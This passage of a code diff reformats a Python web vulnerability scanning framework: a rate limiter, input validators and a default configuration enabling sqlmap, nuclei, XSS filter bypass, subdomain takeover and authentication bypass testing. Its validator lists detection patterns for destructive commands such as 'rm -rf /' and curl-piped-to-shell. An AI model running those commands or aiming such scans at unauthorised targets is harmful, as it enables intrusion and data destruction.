record_operation_result,\n+        get_current_performance_metrics,\n+        is_success_rate_target_met,\n     )\n+\n     PERFORMANCE_MONITOR_AVAILABLE = True\n except ImportError:\n     PERFORMANCE_MONITOR_AVAILABLE = False\n \n # BCAR Integration\n try:\n     from bcar import BCARCore, PantheonBCARIntegration\n+\n     BCAR_AVAILABLE = True\n except ImportError:\n     BCAR_AVAILABLE = False\n \n # Rate limiting for security\n from collections import defaultdict\n from threading import Lock\n-\n \n \n class RateLimiter:\n     \"\"\"Thread-safe rate limiter for security\"\"\"\n \n@@ -92,11 +106,12 @@\n         current_time = time.time()\n \n         with self.lock:\n             # Clean old requests\n             self.requests[identifier] = [\n-                req_time for req_time in self.requests[identifier]\n+                req_time\n+                for req_time in self.requests[identifier]\n                 if current_time - req_time < self.time_window\n             ]\n \n             # Check if under limit\n             if len(self.requests[identifier]) < self.max_requests:\n@@ -115,10 +130,11 @@\n \n             oldest_request = min(self.requests[identifier])\n             wait_time = self.time_window - (current_time - oldest_request)\n             return max(0.0, wait_time)\n \n+\n # Global rate limiter instance\n rate_limiter = RateLimiter()\n \n \n # SECURITY: Input validation imports\n@@ -129,85 +145,106 @@\n \n import functools\n import time\n from typing import Callable, Any\n \n+\n # Performance monitoring decorator\n def monitor_performance(func_name: str = None):\n     \"\"\"Decorator to monitor function performance\"\"\"\n+\n     def decorator(func: Callable) -> Callable:\n         @functools.wraps(func)\n         def wrapper(*args, **kwargs) -> Any:\n             name = func_name or func.__name__\n             start_time = time.time()\n             try:\n                 result = func(*args, **kwargs)\n                 execution_time = time.time() - start_time\n-                \n+\n                 # Log performance only for slow operations\n                 if execution_time > 1.0:\n-                    logger.log(f\"Performance: {name} took {execution_time:.2f}s\", \"DEBUG\")\n+                    logger.log(\n+                        f\"Performance: {name} took {execution_time:.2f}s\", \"DEBUG\"\n+                    )\n                 elif execution_time > 0.1:\n-                    logger.log(f\"Performance: {name} took {execution_time:.3f}s\", \"DEBUG\")\n-                \n+                    logger.log(\n+                        f\"Performance: {name} took {execution_time:.3f}s\", \"DEBUG\"\n+                    )\n+\n                 return result\n             except Exception as e:\n                 execution_time = time.time() - start_time\n-                logger.log(f\"Performance: {name} failed after {execution_time:.3f}s: {e}\", \"ERROR\")\n+                logger.log(\n+                    f\"Performance: {name} failed after {execution_time:.3f}s: {e}\",\n+                    \"ERROR\",\n+                )\n                 raise\n+\n         return wrapper\n+\n     return decorator\n+\n \n # Enhanced input validation for security\n def validate_command_args(args: List[str]) -> bool:\n     \"\"\"Validate command arguments for security with improved precision\"\"\"\n     if not isinstance(args, list):\n         return False\n \n     # Check for dangerous command combinations across arguments\n     if len(args) >= 3:\n-        cmd_str = ' '.join(args[:3]).lower()\n+        cmd_str = \" \".join(args[:3]).lower()\n         dangerous_command_combos = [\n-            r'rm\\s+-[rf]+\\s+/',\n-            r'del\\s+/[sr]',\n-            r'format\\s+c:',\n-            r'chmod\\s+777\\s+/',\n-            r'chown\\s+.*\\s+/',\n+            r\"rm\\s+-[rf]+\\s+/\",\n+            r\"del\\s+/[sr]\",\n+            r\"format\\s+c:\",\n+            r\"chmod\\s+777\\s+/\",\n+            r\"chown\\s+.*\\s+/\",\n         ]\n-        \n+\n         for pattern in dangerous_command_combos:\n             if re.search(pattern, cmd_str):\n-                logging.getLogger('security').warning(f\"Dangerous command combination detected: {cmd_str}\")\n+                logging.getLogger(\"security\").warning(\n+                    f\"Dangerous command combination detected: {cmd_str}\"\n+                )\n                 return False\n \n     # More precise dangerous patterns for individual arguments\n     dangerous_patterns = [\n-        r'[;&|`]',  # Command injection\n-        r'\\$\\(',    # Command substitution\n-        r'\\.\\./|\\.\\.\\\\',  # Path traversal\n-        r'<script[\\s>]|javascript\\s*:|data\\s*:',  # XSS patterns (more specific)\n-        r'union\\s+select|drop\\s+table|delete\\s+from',  # SQL injection\n-        r'>\\s*/dev|>\\s*/proc|>\\s*/sys',  # Dangerous redirections\n-        r'curl\\s+.*\\|\\s*(sh|bash|python)',  # Dangerous pipe operations\n-        r'wget\\s+.*\\|\\s*(sh|bash|python)',  # Dangerous pipe operations\n+        r\"[;&|`]\",  # Command injection\n+        r\"\\$\\(\",  # Command substitution\n+        r\"\\.\\./|\\.\\.\\\\\",  # Path traversal\n+        r\"<script[\\s>]|javascript\\s*:|data\\s*:\",  # XSS patterns (more specific)\n+        r\"union\\s+select|drop\\s+table|delete\\s+from\",  # SQL injection\n+        r\">\\s*/dev|>\\s*/proc|>\\s*/sys\",  # Dangerous redirections\n+        r\"curl\\s+.*\\|\\s*(sh|bash|python)\",  # Dangerous pipe operations\n+        r\"wget\\s+.*\\|\\s*(sh|bash|python)\",  # Dangerous pipe operations\n     ]\n \n     for arg in args:\n         if not isinstance(arg, str):\n             continue\n         if len(arg) > 1000:  # Prevent buffer overflow\n             return False\n-        \n+\n         # Skip validation for common safe patterns\n-        if arg.startswith('-') and len(arg) <= 20 and not arg.startswith('-rf'):  # Likely a flag, but not -rf\n+        if (\n+            arg.startswith(\"-\") and len(arg) <= 20 and not arg.startswith(\"-rf\")\n+        ):  # Likely a flag, but not -rf\n             continue\n-        if arg.replace('.', '').replace('-', '').replace('_', '').isalnum() and len(arg) < 50:  # Safe alphanumeric\n+        if (\n+            arg.replace(\".\", \"\").replace(\"-\", \"\").replace(\"_\", \"\").isalnum()\n+            and len(arg) < 50\n+        ):  # Safe alphanumeric\n             continue\n-            \n+\n         for pattern in dangerous_patterns:\n             if re.search(pattern, arg, re.IGNORECASE):\n-                logging.getLogger('security').warning(f\"Dangerous pattern detected: {pattern} in {arg[:50]}\")\n+                logging.getLogger(\"security\").warning(\n+                    f\"Dangerous pattern detected: {pattern} in {arg[:50]}\"\n+                )\n                 return False\n \n     return True\n \n \n@@ -218,41 +255,62 @@\n \n     # Store original for logging\n     original_filename = filename\n \n     # Remove path traversal attempts (both forward and backward slashes)\n-    filename = re.sub(r'\\.\\.[\\\\/]', '', filename)\n-    filename = re.sub(r'\\.\\.', '', filename)  # Remove remaining .. sequences\n-    \n+    filename = re.sub(r\"\\.\\.[\\\\/]\", \"\", filename)\n+    filename = re.sub(r\"\\.\\.\", \"\", filename)  # Remove remaining .. sequences\n+\n     # Remove path separators entirely\n-    filename = re.sub(r'[\\\\/]', '_', filename)\n+    filename = re.sub(r\"[\\\\/]\", \"_\", filename)\n \n     # Remove special characters that could cause issues\n-    filename = re.sub(r'[<>:\"|?*\\x00-\\x1f]', '_', filename)\n-    \n+    filename = re.sub(r'[<>:\"|?*\\x00-\\x1f]', \"_\", filename)\n+\n     # Remove control characters and extended ASCII\n-    filename = re.sub(r'[\\x80-\\xff]', '_', filename)\n+    filename = re.sub(r\"[\\x80-\\xff]\", \"_\", filename)\n \n     # Remove leading/trailing spaces and dots\n-    filename = filename.strip(' .')\n+    filename = filename.strip(\" .\")\n \n     # Limit length to filesystem safe value\n     filename = filename[:255]\n \n     # Ensure not empty or reserved names\n     reserved_names = {\n-        'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4', 'COM5', \n-        'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', \n-        'LPT6', 'LPT7', 'LPT8', 'LPT9'\n+        \"CON\",\n+        \"PRN\",\n+        \"AUX\",\n+        \"NUL\",\n+        \"COM1\",\n+        \"COM2\",\n+        \"COM3\",\n+        \"COM4\",\n+        \"COM5\",\n+        \"COM6\",\n+        \"COM7\",\n+        \"COM8\",\n+        \"COM9\",\n+        \"LPT1\",\n+        \"LPT2\",\n+        \"LPT3\",\n+        \"LPT4\",\n+        \"LPT5\",\n+        \"LPT6\",\n+        \"LPT7\",\n+        \"LPT8\",\n+        \"LPT9\",\n     }\n-    \n+\n     if not filename.strip() or filename.upper() in reserved_names:\n         filename = \"unnamed_file\"\n-    \n+\n     # Log if significant changes were made\n     if filename != original_filename:\n-        logger.log(f\"Filename sanitized: '{original_filename}' -> '{filename}'\", \"DEBUG\")\n+        logger.log(\n+            f\"Filename sanitized: '{original_filename}' -> '{filename}'\", \"DEBUG\"\n+        )\n \n     return filename\n \n \n def validate_network_address(address: str) -> bool:\n@@ -260,21 +318,23 @@\n     if not isinstance(address, str) or len(address) > 253:\n         return False\n \n     # Block private/localhost addresses in production\n     blocked_patterns = [\n-        r'^127\\.',  # Localhost\n-        r'^192\\.168\\.',  # Private\n-        r'^10\\.',  # Private\n-        r'^172\\.(1[6-9]|2[0-9]|3[01])\\.',  # Private\n-        r'^169\\.254\\.',  # Link-local\n-        r'^0\\.',  # Invalid\n+        r\"^127\\.\",  # Localhost\n+        r\"^192\\.168\\.\",  # Private\n+        r\"^10\\.\",  # Private\n+        r\"^172\\.(1[6-9]|2[0-9]|3[01])\\.\",  # Private\n+        r\"^169\\.254\\.\",  # Link-local\n+        r\"^0\\.\",  # Invalid\n     ]\n \n     for pattern in blocked_patterns:\n         if re.match(pattern, address):\n-            logging.getLogger('security').warning(f\"Blocked private/localhost address: {address}\")\n+            logging.getLogger(\"security\").warning(\n+                f\"Blocked private/localhost address: {address}\"\n+            )\n             return False\n \n     return True\n \n \n@@ -295,10 +355,11 @@\n PLUGINS_DIR = HERE / \"plugins\"\n BACKUP_DIR = HERE / \"backups\"\n \n # ---------- Dependency Backup Functions ----------\n \n+\n def backup_dependencies() -> bool:\n     \"\"\"Create backups of critical dependencies and configurations\"\"\"\n     try:\n         BACKUP_DIR.mkdir(exist_ok=True)\n         timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n@@ -321,36 +382,47 @@\n \n         # Create tool inventory\n         tool_inventory = {\n             \"timestamp\": timestamp,\n             \"installed_tools\": {},\n-            \"python_packages\": {}\n+            \"python_packages\": {},\n         }\n \n         # Check available tools\n         critical_tools = [\n-            \"nuclei\", \"subfinder\", \"httpx\", \"naabu\", \"sqlmap\",\n-            \"nmap\", \"ffu\", \"gobuster\", \"dalfox\", \"subjack\", \"subzy\"\n+            \"nuclei\",\n+            \"subfinder\",\n+            \"httpx\",\n+            \"naabu\",\n+            \"sqlmap\",\n+            \"nmap\",\n+            \"ffu\",\n+            \"gobuster\",\n+            \"dalfox\",\n+            \"subjack\",\n+            \"subzy\",\n         ]\n \n         for tool in critical_tools:\n             tool_path = which(tool)\n             tool_inventory[\"installed_tools\"][tool] = {\n                 \"available\": bool(tool_path),\n-                \"path\": str(tool_path) if tool_path else None\n+                \"path\": str(tool_path) if tool_path else None,\n             }\n \n         # Save inventory\n-        atomic_write(backup_path / \"tool_inventory.json\",\n-                    json.dumps(tool_inventory, indent=2))\n+        atomic_write(\n+            backup_path / \"tool_inventory.json\", json.dumps(tool_inventory, indent=2)\n+        )\n \n         logger.log(f\"Dependencies backed up to: {backup_path}\", \"SUCCESS\")\n         return True\n \n     except Exception as e:\n         logger.log(f\"Failed to backup dependencies: {e}\", \"WARNING\")\n         return False\n+\n \n def restore_dependencies(backup_path: Path) -> bool:\n     \"\"\"Restore dependencies from backup\"\"\"\n     try:\n         if not backup_path.exists():\n@@ -366,10 +438,11 @@\n         return True\n \n     except Exception as e:\n         logger.log(f\"Failed to restore dependencies: {e}\", \"WARNING\")\n         return False\n+\n \n # ---------- Configuration ----------\n DEFAULT_CFG: Dict[str, Any] = {\n     \"repos\": {\n         \"SecLists\": \"https://github.com/danielmiessler/SecLists.git\",\n@@ -386,20 +459,20 @@\n         \"KnightSec\": \"https://github.com/knightsec/nuclei-templates-ksec.git\",\n         \"AdditionalWordlists\": \"https://github.com/assetnote/commonspeak2-wordlists.git\",\n         \"OneListForAll\": \"https://github.com/six2dez/OneListForAll.git\",\n         \"WebDiscoveryWordlists\": \"https://github.com/Bo0oM/fuzz.txt.git\",\n         \"XSSPayloads\": \"https://github.com/payloadbox/xss-payload-list.git\",\n-        \"SQLIPayloads\": \"https://github.com/payloadbox/sql-injection-payload-list.git\"\n+        \"SQLIPayloads\": \"https://github.com/payloadbox/sql-injection-payload-list.git\",\n     },\n     \"limits\": {\n         \"parallel_jobs\": 20,\n         \"http_timeout\": 15,\n         \"rps\": 500,\n         \"max_concurrent_scans\": 8,\n         \"http_revalidation_timeout\": 8,\n         \"max_subdomain_depth\": 3,\n-        \"max_crawl_time\": 600\n+        \"max_crawl_time\": 600,\n     },\n     \"nuclei\": {\n         \"enabled\": True,\n         \"severity\": \"low,medium,high,critical\",\n         \"rps\": 800,\n@@ -412,25 +485,25 @@\n         \"template_sources\": [\n             \"~/nuclei-templates\",\n             \"~/nuclei-community\",\n             \"~/nuclei-fuzzing\",\n             \"~/custom-nuclei\",\n-            \"~/nuclei-ksec\"\n+            \"~/nuclei-ksec\",\n         ],\n         \"update_templates\": True,\n         \"template_categories\": \"all\",\n         \"exclude_templates\": [],\n-        \"custom_payloads\": True\n+        \"custom_payloads\": True,\n     },\n     \"endpoints\": {\n         \"use_gau\": True,\n         \"use_katana\": True,\n         \"use_waybackurls\": True,\n         \"use_gospider\": True,\n         \"max_urls_per_target\": 5000,\n         \"katana_depth\": 2,\n-        \"gospider_depth\": 3\n+        \"gospider_depth\": 3,\n     },\n     \"advanced_scanning\": {\n         \"ssl_analysis\": True,\n         \"dns_enumeration\": True,\n         \"technology_detection\": True,\n@@ -443,11 +516,11 @@\n         \"jwt_analysis\": True,\n         \"cloud_storage_buckets\": True,\n         \"container_scanning\": True,\n         \"shodan_integration\": True,\n         \"threat_intelligence\": True,\n-        \"compliance_checks\": True\n+        \"compliance_checks\": True,\n     },\n     \"fuzzing\": {\n         \"enable_dirb\": True,\n         \"enable_gobuster\": True,\n         \"enable_ffu\": True,\n@@ -458,31 +531,31 @@\n         \"recursive_fuzzing\": True,\n         \"status_codes\": \"200,201,202,204,301,302,303,307,308,401,403,405,500\",\n         \"threads\": 50,\n         \"wordlist_sources\": [\"seclists\", \"common\", \"big\", \"directory-list\", \"custom\"],\n         \"parameter_fuzzing\": True,\n-        \"subdomain_fuzzing\": True\n+        \"subdomain_fuzzing\": True,\n     },\n     \"xss_testing\": {\n         \"enabled\": True,\n         \"xss_strike\": True,\n         \"custom_payloads\": True,\n         \"reflected_xss\": True,\n         \"stored_xss\": True,\n         \"dom_xss\": True,\n         \"blind_xss\": True,\n         \"payload_encoding\": True,\n-        \"bypass_filters\": True\n+        \"bypass_filters\": True,\n     },\n     \"subdomain_takeover\": {\n         \"enabled\": True,\n         \"subjack\": True,\n         \"subzy\": True,\n         \"nuclei_takeover\": True,\n         \"custom_signatures\": True,\n         \"timeout\": 30,\n-        \"threads\": 10\n+        \"threads\": 10,\n     },\n     \"nmap_scanning\": {\n         \"enabled\": True,\n         \"quick_scan\": True,\n         \"full_scan\": False,\n@@ -491,35 +564,35 @@\n         \"os_detection\": True,\n         \"script_scanning\": True,\n         \"vulnerability_scripts\": True,\n         \"top_ports\": 1000,\n         \"timing\": 4,\n-        \"custom_scripts\": []\n+        \"custom_scripts\": [],\n     },\n     \"sqlmap_testing\": {\n         \"enabled\": True,\n-        \"crawl_depth\": 1,                 # Reduced from 2\n-        \"level\": 2,                       # Reduced from 3\n+        \"crawl_depth\": 1,  # Reduced from 2\n+        \"level\": 2,  # Reduced from 3\n         \"risk\": 2,\n         \"techniques\": \"BEUST\",\n-        \"threads\": 2,                     # Reduced from 5\n+        \"threads\": 2,  # Reduced from 5\n         \"batch_mode\": True,\n         \"tamper_scripts\": [],\n         \"custom_payloads\": True,\n         \"time_based\": True,\n         \"error_based\": True,\n         \"union_based\": True,\n-        \"timeout\": 600,                   # Add timeout setting\n-        \"max_retries\": 1                  # Add retry limit\n+        \"timeout\": 600,  # Add timeout setting\n+        \"max_retries\": 1,  # Add retry limit\n     },\n     \"report\": {\n         \"formats\": [\"html\", \"json\", \"csv\", \"sari\"],\n         \"auto_open_html\": True,\n         \"include_viz\": True,\n         \"risk_scoring\": True,\n         \"vulnerability_correlation\": True,\n-        \"executive_summary\": True\n+        \"executive_summary\": True,\n     },\n     \"enhanced_reporting\": {\n         \"enabled\": True,\n         \"enable_deep_analysis\": True,\n         \"enable_correlation\": True,\n@@ -529,119 +602,112 @@\n             \"asset_criticality\": 7.0,\n             \"data_sensitivity\": 6.0,\n             \"availability_requirement\": 8.0,\n             \"compliance_requirements\": [\"GDPR\", \"SOX\", \"HIPAA\"],\n             \"business_hours_impact\": 1.5,\n-            \"revenue_impact_per_hour\": 25000.0\n-        }\n+            \"revenue_impact_per_hour\": 25000.0,\n+        },\n     },\n-    \"plugins\": {\n-        \"enabled\": True,\n-        \"directory\": str(PLUGINS_DIR),\n-        \"auto_execute\": False\n-    },\n-    \"fallback\": {\n-        \"enabled\": True,\n-        \"direct_downloads\": True,\n-        \"mirror_sites\": True\n-    },\n+    \"plugins\": {\"enabled\": True, \"directory\": str(PLUGINS_DIR), \"auto_execute\": False},\n+    \"fallback\": {\"enabled\": True, \"direct_downloads\": True, \"mirror_sites\": True},\n     \"resource_management\": {\n-        \"cpu_threshold\": 75,              # Reduced from 85\n-        \"memory_threshold\": 80,           # Reduced from 90\n-        \"disk_threshold\": 90,             # Reduced from 95\n-        \"monitor_interval\": 3,            # Reduced for more frequent monitoring\n+        \"cpu_threshold\": 75,  # Reduced from 85\n+        \"memory_threshold\": 80,  # Reduced from 90\n+        \"disk_threshold\": 90,  # Reduced from 95\n+        \"monitor_interval\": 3,  # Reduced for more frequent monitoring\n         \"auto_cleanup\": True,\n         \"cache_enabled\": True,\n-        \"max_cache_size_mb\": 1024\n+        \"max_cache_size_mb\": 1024,\n     },\n     \"error_handling\": {\n         \"max_retries\": 3,\n         \"retry_delay\": 2,\n         \"continue_on_error\": True,\n         \"log_level\": \"INFO\",\n         \"graceful_degradation\": True,\n-        \"failover_tools\": True\n+        \"failover_tools\": True,\n     },\n     \"validation\": {\n         \"validate_tools_on_startup\": True,\n         \"check_dependencies\": True,\n         \"warn_on_missing_tools\": True,\n         \"verify_target_reachability\": True,\n-        \"pre_scan_validation\": True\n+        \"pre_scan_validation\": True,\n     },\n     \"authentication\": {\n         \"enabled\": False,\n         \"cookies_file\": \"\",\n         \"headers_file\": \"\",\n         \"basic_auth\": \"\",\n-        \"bearer_token\": \"\"\n+        \"bearer_token\": \"\",\n     },\n     \"network_analysis\": {\n         \"traceroute\": True,\n         \"whois_lookup\": True,\n         \"reverse_dns\": True,\n         \"asn_lookup\": True,\n-        \"geolocation\": True\n+        \"geolocation\": True,\n     },\n     \"api_security\": {\n         \"enabled\": True,\n         \"swagger_discovery\": True,\n         \"openapi_analysis\": True,\n         \"rest_api_fuzzing\": True,\n         \"graphql_introspection\": True,\n         \"soap_testing\": True,\n         \"rate_limit_testing\": True,\n-        \"authentication_bypass\": True\n+        \"authentication_bypass\": True,\n     },\n     \"cloud_security\": {\n         \"enabled\": True,\n         \"aws_s3_buckets\": True,\n         \"azure_storage\": True,\n         \"gcp_buckets\": True,\n         \"cloud_metadata\": True,\n         \"container_registries\": True,\n-        \"kubernetes_discovery\": True\n+        \"kubernetes_discovery\": True,\n     },\n     \"threat_intelligence\": {\n         \"enabled\": True,\n         \"virustotal_api\": \"\",\n         \"shodan_api\": \"\",\n         \"censys_api\": \"\",\n         \"passive_total_api\": \"\",\n         \"malware_detection\": True,\n         \"reputation_checks\": True,\n-        \"ioc_correlation\": True\n+        \"ioc_correlation\": True,\n     },\n     \"ml_analysis\": {\n         \"enabled\": True,\n         \"false_positive_reduction\": True,\n         \"vulnerability_prioritization\": True,\n         \"anomaly_detection\": True,\n         \"pattern_recognition\": True,\n-        \"risk_scoring_ml\": True\n+        \"risk_scoring_ml\": True,\n     },\n     \"compliance\": {\n         \"enabled\": True,\n         \"owasp_top10\": True,\n         \"nist_framework\": True,\n         \"pci_dss\": True,\n         \"gdpr_checks\": True,\n         \"hipaa_checks\": True,\n-        \"iso27001\": True\n+        \"iso27001\": True,\n     },\n     \"cicd_integration\": {\n         \"enabled\": False,\n         \"github_actions\": True,\n         \"gitlab_ci\": True,\n         \"jenkins\": True,\n         \"webhook_notifications\": True,\n         \"api_endpoints\": True,\n-        \"scheduled_scans\": True\n-    }\n+        \"scheduled_scans\": True,\n+    },\n }\n \n # ---------- Logging ----------\n+\n \n class Logger:\n \n     def __init__(self):\n         self.log_file = LOG_DIR / \"bl4ckc3ll_p4nth30n.log\"\n@@ -651,11 +717,11 @@\n         self.level_hierarchy = {\n             \"DEBUG\": 0,\n             \"INFO\": 1,\n             \"WARNING\": 2,\n             \"ERROR\": 3,\n-            \"SUCCESS\": 1\n+            \"SUCCESS\": 1,\n         }\n \n     def set_level(self, level: str):\n         \"\"\"Set the minimum logging level\"\"\"\n         if level in self.level_hierarchy:\n@@ -691,122 +757,161 @@\n             with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\n                 f.write(log_message + \"\\n\")\n         except Exception as e:\n             logging.warning(f\"Operation failed: {e}\")\n             # Consider if this error should be handled differently\n+\n+\n logger = Logger()\n \n \n # Add alias for compatibility with other modules\n class PantheonLogger:\n     \"\"\"Compatibility wrapper for Logger class\"\"\"\n+\n     def __init__(self, name=\"PANTHEON\", log_level=None):\n         self._logger = Logger()\n         self.name = name\n         if log_level:\n             self._logger.set_level(log_level)\n-    \n+\n     def log(self, message: str, level: str = \"INFO\"):\n         return self._logger.log(f\"[{self.name}] {message}\", level)\n-    \n+\n     def info(self, message: str):\n         return self.log(message, \"INFO\")\n-    \n+\n     def warning(self, message: str):\n         return self.log(message, \"WARNING\")\n-    \n+\n     def error(self, message: str):\n         return self.log(message, \"ERROR\")\n-    \n+\n     def debug(self, message: str):\n         return self.log(message, \"DEBUG\")\n-    \n+\n     def success(self, message: str):\n         return self.log(message, \"SUCCESS\")\n \n+\n # ---------- Error Handling Helpers ----------\n-def safe_execute(func, *args, default=None, error_msg=\"Operation failed\", log_level=\"ERROR\", **kwargs):\n+def safe_execute(\n+    func, *args, default=None, error_msg=\"Operation failed\", log_level=\"ERROR\", **kwargs\n+):\n     \"\"\"Safely execute a function with enhanced error handling and recovery suggestions\"\"\"\n     try:\n         return func(*args, **kwargs)\n     except FileNotFoundError as e:\n         # Provide specific guidance for file not found errors\n         filepath = str(e).split(\"'\")[1] if \"'\" in str(e) else \"unknown\"\n         logger.log(f\"{error_msg} - File not found: {filepath}\", log_level)\n-        logger.log(\"Recovery suggestion: Check if file exists, verify path permissions, or create missing directory\", \"INFO\")\n+        logger.log(\n+            \"Recovery suggestion: Check if file exists, verify path permissions, or create missing directory\",\n+            \"INFO\",\n+        )\n         return default\n     except PermissionError as e:\n         # Provide specific guidance for permission errors\n         filepath = str(e).split(\"'\")[1] if \"'\" in str(e) else \"unknown\"\n         logger.log(f\"{error_msg} - Permission denied: {filepath}\", log_level)\n-        logger.log(\"Recovery suggestion: Run with appropriate permissions or check file/directory ownership\", \"INFO\")\n+        logger.log(\n+            \"Recovery suggestion: Run with appropriate permissions or check file/directory ownership\",\n+            \"INFO\",\n+        )\n         return default\n     except subprocess.TimeoutExpired as e:\n         # Provide guidance for timeout errors with tool-specific suggestions\n-        cmd = getattr(e, 'cmd', 'unknown command')\n-        timeout_val = getattr(e, 'timeout', 'unknown')\n+        cmd = getattr(e, \"cmd\", \"unknown command\")\n+        timeout_val = getattr(e, \"timeout\", \"unknown\")\n         logger.log(f\"{error_msg} - Timeout after {timeout_val}s: {cmd}\", log_level)\n-        logger.log(\"Recovery suggestion: Increase timeout, reduce scan scope, or check network connectivity\", \"INFO\")\n+        logger.log(\n+            \"Recovery suggestion: Increase timeout, reduce scan scope, or check network connectivity\",\n+            \"INFO\",\n+        )\n         return default\n     except subprocess.CalledProcessError as e:\n         # Enhanced handling for subprocess errors\n-        cmd = e.cmd if hasattr(e, 'cmd') else 'unknown'\n-        returncode = e.returncode if hasattr(e, 'returncode') else 'unknown'\n-        output = e.output if hasattr(e, 'output') else ''\n-        stderr = e.stderr if hasattr(e, 'stderr') else ''\n-\n-        logger.log(f\"{error_msg} - Command failed (exit code: {returncode}): {cmd}\", log_level)\n+        cmd = e.cmd if hasattr(e, \"cmd\") else \"unknown\"\n+        returncode = e.returncode if hasattr(e, \"returncode\") else \"unknown\"\n+        output = e.output if hasattr(e, \"output\") else \"\"\n+        stderr = e.stderr if hasattr(e, \"stderr\") else \"\"\n+\n+        logger.log(\n+            f\"{error_msg} - Command failed (exit code: {returncode}): {cmd}\", log_level\n+        )\n         if output:\n             logger.log(f\"Command output: {output[:500]}...\", \"DEBUG\")\n         if stderr:\n             logger.log(f\"Command stderr: {stderr[:500]}...\", \"DEBUG\")\n \n         # Provide tool-specific recovery suggestions\n         if isinstance(cmd, list) and len(cmd) > 0:\n             tool_name = cmd[0] if isinstance(cmd[0], str) else str(cmd[0])\n             recovery_suggestions = {\n-                'nuclei': 'Update nuclei templates with: nuclei -update-templates',\n-                'nmap': 'Try reducing scan intensity or check target accessibility',\n-                'subfinder': 'Check internet connectivity and API keys configuration',\n-                'httpx': 'Verify target URLs are accessible and reduce concurrency',\n-                'naabu': 'Check network permissions and reduce port range',\n-                'sqlmap': 'Verify target parameter and reduce detection level'\n+                \"nuclei\": \"Update nuclei templates with: nuclei -update-templates\",\n+                \"nmap\": \"Try reducing scan intensity or check target accessibility\",\n+                \"subfinder\": \"Check internet connectivity and API keys configuration\",\n+                \"httpx\": \"Verify target URLs are accessible and reduce concurrency\",\n+                \"naabu\": \"Check network permissions and reduce port range\",\n+                \"sqlmap\": \"Verify target parameter and reduce detection level\",\n             }\n \n             for tool, suggestion in recovery_suggestions.items():\n                 if tool in tool_name:\n                     logger.log(f\"Recovery suggestion: {suggestion}\", \"INFO\")\n                     break\n \n         return default\n     except ConnectionError as e:\n         logger.log(f\"{error_msg} - Network connection error: {e}\", log_level)\n-        logger.log(\"Recovery suggestion: Check internet connectivity, proxy settings, or target availability\", \"INFO\")\n+        logger.log(\n+            \"Recovery suggestion: Check internet connectivity, proxy settings, or target availability\",\n+            \"INFO\",\n+        )\n         return default\n     except OSError as e:\n         logger.log(f\"{error_msg} - System error: {e}\", log_level)\n-        logger.log(\"Recovery suggestion: Check system resources, disk space, or file descriptors\", \"INFO\")\n+        logger.log(\n+            \"Recovery suggestion: Check system resources, disk space, or file descriptors\",\n+            \"INFO\",\n+        )\n         return default\n     except Exception as e:\n         # Enhanced general exception handling with more context\n         error_type = type(e).__name__\n         logger.log(f\"{error_msg} - {error_type}: {e}\", log_level)\n \n         # Try to provide contextual recovery suggestions based on error content\n         error_str = str(e).lower()\n-        if 'connection' in error_str or 'network' in error_str:\n-            logger.log(\"Recovery suggestion: Check network connectivity and firewall settings\", \"INFO\")\n-        elif 'memory' in error_str or 'resource' in error_str:\n-            logger.log(\"Recovery suggestion: Free up system resources or reduce scan intensity\", \"INFO\")\n-        elif 'configuration' in error_str or 'config' in error_str:\n-            logger.log(\"Recovery suggestion: Verify configuration file syntax and required settings\", \"INFO\")\n-        elif 'authentication' in error_str or 'auth' in error_str:\n-            logger.log(\"Recovery suggestion: Check API keys, credentials, or authentication settings\", \"INFO\")\n+        if \"connection\" in error_str or \"network\" in error_str:\n+            logger.log(\n+                \"Recovery suggestion: Check network connectivity and firewall settings\",\n+                \"INFO\",\n+            )\n+        elif \"memory\" in error_str or \"resource\" in error_str:\n+            logger.log(\n+                \"Recovery suggestion: Free up system resources or reduce scan intensity\",\n+                \"INFO\",\n+            )\n+        elif \"configuration\" in error_str or \"config\" in error_str:\n+            logger.log(\n+                \"Recovery suggestion: Verify configuration file syntax and required settings\",\n+                \"INFO\",\n+            )\n+        elif \"authentication\" in error_str or \"auth\" in error_str:\n+            logger.log(\n+                \"Recovery suggestion: Check API keys, credentials, or authentication settings\",\n+                \"INFO\",\n+            )\n         else:\n-            logger.log(\"Recovery suggestion: Check logs for more details, verify input parameters, or try with reduced scope\", \"INFO\")\n+            logger.log(\n+                \"Recovery suggestion: Check logs for more details, verify input parameters, or try with reduced scope\",\n+                \"INFO\",\n+            )\n \n         return default\n+\n \n def safe_file_operation(operation, path, *args, **kwargs):\n     \"\"\"Safely perform file operations with proper error handling\"\"\"\n     try:\n         return operation(path, *args, **kwargs)\n@@ -826,72 +931,73 @@\n \n def get_system_resources() -> Dict[str, Any]:\n     \"\"\"Get current system resource usage for optimization decisions\"\"\"\n     try:\n         import psutil\n-        \n+\n         cpu_percent = psutil.cpu_percent(interval=0.1)\n         memory = psutil.virtual_memory()\n-        disk = psutil.disk_usage('/')\n-        \n+        disk = psutil.disk_usage(\"/\")\n+\n         return {\n-            'cpu_percent': cpu_percent,\n-            'memory_percent': memory.percent,\n-            'memory_available_gb': memory.available / (1024**3),\n-            'disk_percent': disk.percent,\n-            'disk_free_gb': disk.free / (1024**3)\n+            \"cpu_percent\": cpu_percent,\n+            \"memory_percent\": memory.percent,\n+            \"memory_available_gb\": memory.available / (1024**3),\n+            \"disk_percent\": disk.percent,\n+            \"disk_free_gb\": disk.free / (1024**3),\n         }\n     except ImportError:\n-        return {'error': 'psutil not available'}\n+        return {\"error\": \"psutil not available\"}\n     except Exception as e:\n         logger.log(f\"Failed to get system resources: {e}\", \"DEBUG\")\n-        return {'error': str(e)}\n+        return {\"error\": str(e)}\n+\n \n def optimize_concurrency_based_on_resources() -> Dict[str, int]:\n     \"\"\"Dynamically optimize concurrency settings based on available resources\"\"\"\n     resources = get_system_resources()\n-    \n-    if 'error' in resources:\n+\n+    if \"error\" in resources:\n         # Fallback to conservative defaults\n-        return {\n-            'max_concurrent_scans': 4,\n-            'parallel_jobs': 5,\n-            'http_timeout': 15\n-        }\n-    \n+        return {\"max_concurrent_scans\": 4, \"parallel_jobs\": 5, \"http_timeout\": 15}\n+\n     # Adjust concurrency based on available resources\n-    cpu_percent = resources.get('cpu_percent', 50)\n-    memory_percent = resources.get('memory_percent', 50)\n-    memory_available_gb = resources.get('memory_available_gb', 